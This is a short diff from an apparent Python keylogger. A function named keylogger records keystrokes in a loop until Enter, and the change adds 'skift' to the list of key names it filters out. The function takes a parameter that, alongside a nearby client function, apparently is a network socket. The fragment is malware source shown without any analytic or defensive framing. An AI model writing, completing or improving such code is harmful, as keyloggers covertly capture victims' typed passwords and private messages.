@@ -21,7 +21,7 @@ def client():
 def keylogger(s):
     while True:
         list = []
-        remove = ["unknown", "shift", "backspace"]
+        remove = ["unknown", "shift", "backspace", "skift"]
         recorded = keyboard.record(until='enter')
 
         for event in recorded:
